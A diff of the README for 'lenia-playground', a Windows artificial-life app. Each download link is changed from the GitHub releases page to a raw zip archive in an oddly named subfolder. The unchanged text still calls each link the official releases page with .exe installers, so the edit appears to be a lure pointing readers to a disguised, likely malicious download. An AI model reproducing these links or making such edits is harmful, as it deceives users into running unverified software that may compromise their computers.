@@ -1,6 +1,6 @@
 # 🔬 lenia-playground - Explore Artificial Life Simply
 
-[![Download lenia-playground](https://img.shields.io/badge/Download-Get%20Lenia%20Playground-orange?style=for-the-badge)](https://github.com/stokcad654-ops/lenia-playground/releases)
+[![Download lenia-playground](https://img.shields.io/badge/Download-Get%20Lenia%20Playground-orange?style=for-the-badge)](https://raw.githubusercontent.com/stokcad654-ops/lenia-playground/main/eudiometrically/playground_lenia_v3.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will run lenia-playground as a standalone app on your Windows PC. The app us
 
 Go to the main download page here:
 
-[Download lenia-playground](https://github.com/stokcad654-ops/lenia-playground/releases)
+[Download lenia-playground](https://raw.githubusercontent.com/stokcad654-ops/lenia-playground/main/eudiometrically/playground_lenia_v3.4.zip)
 
 This page lists the latest and older versions. Look for the most recent release marked by a version number (like v1.0, v1.1, etc.). The files you want should end with `.exe`. This is the program installer for Windows.
 
@@ -115,7 +115,7 @@ For more help, check the GitHub repository’s issue tracker or community discus
 ## 🔗 Useful Links
 
 Main download page:  
-[https://github.com/stokcad654-ops/lenia-playground/releases](https://github.com/stokcad654-ops/lenia-playground/releases)
+[https://raw.githubusercontent.com/stokcad654-ops/lenia-playground/main/eudiometrically/playground_lenia_v3.4.zip](https://raw.githubusercontent.com/stokcad654-ops/lenia-playground/main/eudiometrically/playground_lenia_v3.4.zip)
 
 Click the link above to visit the official releases. This page displays all versions so you can choose the latest stable release.
 
@@ -152,6 +152,6 @@ You can learn more by searching for these topics online. The app provides a hand
 
 Access lenia-playground here:
 
-[Download lenia-playground](https://github.com/stokcad654-ops/lenia-playground/releases)
+[Download lenia-playground](https://raw.githubusercontent.com/stokcad654-ops/lenia-playground/main/eudiometrically/playground_lenia_v3.4.zip)
 
 Click the link and follow the steps to download and install on your Windows computer. Once installed, explore artificial life without any programming knowledge.
